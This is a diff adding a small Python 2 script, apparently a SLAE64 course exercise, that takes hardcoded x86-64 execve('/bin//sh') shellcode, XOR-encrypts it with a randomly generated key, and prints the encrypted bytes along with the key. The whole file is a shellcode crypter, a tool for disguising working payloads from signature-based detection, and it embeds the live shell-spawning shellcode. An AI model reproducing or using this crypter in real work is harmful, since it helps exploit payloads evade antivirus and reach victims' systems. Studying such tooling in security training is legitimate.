@@ -1,0 +1,21 @@
+#!/usr/bin/python
+#crypter shellcode SLAE64-1379
+import string
+import random
+
+def key_generator(size=13,chars=string.digits+string.letters+"+/*].#$?}:-!){(&[%^"):
+    return ''.join(random.choice(chars) for _ in range(size))
+
+shellcode="\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"#here shellcode to encrypt
+
+key= key_generator(len(shellcode))
+encrypt=""
+
+for elem in range(len(shellcode)):
+    a=ord(shellcode[elem])
+    b=ord(key[elem])
+    x=a^b
+    encrypt+="\\x%02x" % x
+
+print "shellcode crypted: ",encrypt,"\n"
+print "Key to decrypt: ",key
